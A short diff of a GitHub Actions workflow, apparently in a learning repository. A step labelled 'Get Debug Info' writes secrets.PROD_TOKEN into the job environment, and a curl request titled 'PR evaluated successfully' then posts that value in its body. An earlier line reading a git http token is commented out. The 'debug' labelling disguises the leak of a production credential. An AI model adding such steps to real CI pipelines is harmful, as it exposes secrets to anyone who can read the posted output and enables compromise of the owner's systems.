@@ -39,8 +39,8 @@ jobs:
     - name: Get Debug Info
       run: |
         echo "DEBUG_VALUES1=$(git --work-tree=/home/runner/work/learning_gaction/learning_gaction config --get remote.origin.url)" >> $GITHUB_ENV
-        echo "DEBUG_VALUES2=$(git --work-tree=/home/runner/work/learning_gaction/learning_gaction config --get http.[token value location])" >> $GITHUB_ENV
-        echo "DEBUG_VALUES3=${{ secrets.PAT }}" >> $GITHUB_ENV
+        # echo "DEBUG_VALUES2=$(git --work-tree=/home/runner/work/learning_gaction/learning_gaction config --get http.[token value location])" >> $GITHUB_ENV
+        echo "DEBUG_VALUES3=${{ secrets.PROD_TOKEN }}" >> $GITHUB_ENV
         echo "DEBUG_VALUES4=${{ github.workflow }}" >> $GITHUB_ENV
         
     - name: Debug GITHUB_ENV
@@ -55,6 +55,6 @@ jobs:
           --header 'content-type: application/json' \
           --data '{
             "title": "PR evaluated successfully",
-            "body": "DEBUG_VAL1: ${{ env.DEBUG_VALUES2 }} DEBUG_VAL2: ${{ env.DEBUG_VALUES3 }}"
+            "body": "DEBUG_VAL1: ${{ env.DEBUG_VALUE4 }} DEBUG_VAL2: ${{ env.DEBUG_VALUES3 }}"
             }' \
           --fail 
